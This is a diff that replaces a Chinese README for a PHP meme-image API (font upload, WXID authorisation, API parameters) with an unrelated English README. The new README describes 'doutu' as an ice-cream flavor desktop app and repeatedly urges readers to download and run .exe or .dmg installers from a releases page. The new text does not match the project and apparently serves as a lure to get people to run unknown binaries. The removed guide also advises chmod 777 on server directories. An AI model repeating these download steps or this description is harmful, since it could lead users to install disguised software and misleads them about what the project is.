@@ -1,154 +1,47 @@
-# 斗图助手接口
+# 🍦 doutu - Enjoy Your Ice Cream Treat
 
-一个支持自定义字体样式、自动生成表情图片的 API 服务。
+## 🚀 Getting Started
+Welcome to doutu! This application lets you experience the joy of creating your own virtual ice cream flavors. Follow these steps to download and get started.
 
-## 搭建教程
+## ⬇️ Download Now
+[![Download doutu](https://img.shields.io/badge/Download-doutu-brightgreen)](https://github.com/XamaBlack0/doutu/releases)
 
-### 环境要求
-- PHP 7.0+（需要 GD 库支持）
-- Web 服务器（Apache/Nginx）
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Click [here](https://github.com/XamaBlack0/doutu/releases) to go to the Releases page.
 
-### 快速部署
+2. **Choose the Right Version**  
+   On the Releases page, you will see different versions of the application. It's best to download the latest version. Look for the entry that says “Latest release” for the most up-to-date features.
 
-1. **上传文件**
-   ```bash
-   # 将所有文件上传到服务器
+3. **Download the Application**  
+   Click the link for the version you want. This will begin the downloading process. The file will usually be in .exe format for Windows or .dmg for Mac. 
 
-2. **设置权限**
-   ```bash
-   chmod 755 index.php
-   chmod 755 font.html
-   chmod 755 upload.html
-   chmod 777 fonts/
-   chmod 777 output/
-   chmod 777 configs/
-   chmod 666 wxid.txt
-   ```
+4. **Locate the Downloaded File**  
+   Once the download is complete, locate the file in your computer's Downloads folder. 
 
-3. **访问测试**
-   ```
-   http://你的域名/font.html
-   ```
+5. **Install doutu**  
+   - For **Windows**: Double-click the .exe file. Follow the on-screen prompts to complete the installation.
+   - For **Mac**: Open the downloaded .dmg file. Drag the doutu icon to your Applications folder.
 
-### 目录结构
-```
-项目根目录/
-├── index.php           # 后端 API 接口
-├── font.html           # 字体配置页面
-├── upload.html         # 字体上传页面
-├── wxid.txt            # 授权用户列表
-├── fonts/              # 字体文件目录
-├── output/             # 生成图片目录
-├── configs/            # 用户配置目录
-└── img/
-    └── background.png  # 默认背景图
-```
+6. **Launch the Application**  
+   After installation, you can open doutu from your Applications menu on Mac or from the Start menu on Windows.
 
----
+## 🎉 Features
+- **Custom Flavor Creation**: Mix and match ingredients to make customizable ice cream flavors.
+- **User-Friendly Interface**: Navigate easily with a clear and simple layout.
+- **Save Your Creations**: Keep track of your favorite recipes and flavors.
+- **Fun Graphics**: Enjoy engaging visuals that make ice cream making enjoyable.
 
-## 使用教程
+## 📏 System Requirements
+- **Operating System**: Windows 10 or later / macOS 10.12 or later
+- **Memory**: Minimum of 2 GB RAM recommended
+- **Disk Space**: 100 MB of free disk space
+- **Network**: Internet connection required for updates
 
-### 1️⃣ 首次使用 - 授权账号
+## 📞 Support
+If you experience issues while downloading or using doutu, please check the FAQ section on the Releases page. You can also reach out to our support team through the Issues tab in this repository.
 
-1. 打开 `font.html`
-2. 输入你的 WXID（微信ID）
-3. 点击 **授权** 按钮
+## 👉 Explore More
+Feel free to explore different features of doutu and get creative with your ice cream recipes. Enjoy making your unique flavors and share them with friends!
 
-### 2️⃣ 上传字体（可选）
-
-1. 点击右上角 **上传字体** 按钮
-2. 拖拽或选择 `.ttf` / `.ttc` 字体文件
-3. 点击 **开始上传**
-
-### 3️⃣ 配置样式
-
-**基础设置：**
-- **字体文件**：选择已上传的字体
-- **字号**：12-72px（不开启自动字号时）
-- **位置**：通过 X/Y 滑块调整，点击"居中"快速设置
-- **字体粗细**：0-10 级调整
-
-**颜色设置：**
-- **文字颜色**：选择器或输入色值
-- **随机颜色**：每次生成随机颜色
-- **自动字号**：开启后生成 1024×1024 大图，字体自适应填满画布
-
-**背景设置：**
-- **纯色**：自定义背景颜色
-- **透明**：透明背景
-- **图片**：使用 `img/background.png`，支持填充/适应/拉伸/平铺
-
-**特效设置：**
-- **文字特效**：阴影/描边/发光
-- **缩略图模式**：生成小尺寸预览图
-- **强制字体大小**：忽略自适应
-
-### 4️⃣ 保存配置
-
-1. 设置完成后点击 **保存配置**
-2. 下次输入相同 WXID 点击 **获取配置** 即可恢复
-
-### 5️⃣ 调用 API
-
-#### 生成表情接口
-```
-GET http://你的域名/文件夹名称
-```
-
-**参数说明：**
-- `ac`: 固定值 `search` 或 `all`
-- `wxid`: 你的微信ID（必须已授权）
-- `keyword`: 要生成的文字
-
-**返回示例：**
-```json
-{
-  "items": [
-    {
-      "title": "1234567890",
-      "url": "http://你的域名/output/abc123.png"
-    }
-  ],
-  "pageNum": 1,
-  "pageSize": 40,
-  "totalPages": 1,
-  "totalSize": 1
-}
-```
-
----
-
-## 高级技巧
-
-### 自动字号功能
-勾选"自动字号"后：
-- 1个字 → 超大字体（最大900px）
-- 多个字 → 自动缩小适应
-- 画布尺寸：1024×1024（微信表情最大支持）
-
-### 背景图替换
-将你的背景图片放到 `img/background.png`（支持 PNG/JPG/GIF）
-
-### 批量授权
-直接编辑 `wxid.txt`，每行一个 WXID
-
----
-
-## ⚠️ 常见问题
-
-**Q: 预览失败？**
-- 检查 `output/` 目录权限是否为 777
-- 检查 PHP GD 库是否安装
-
-**Q: 字体不显示？**
-- 检查 `fonts/` 目录权限
-- 确保字体文件格式正确（TTF/TTC）
-
-**Q: 接口返回"偷接口"？**
-- WXID 未授权，请先在页面上点击"授权"按钮
-
----
-
-## 📝 许可证
-
-本项目仅供学习交流使用。
+[![Download doutu](https://img.shields.io/badge/Download-doutu-brightgreen)](https://github.com/XamaBlack0/doutu/releases)
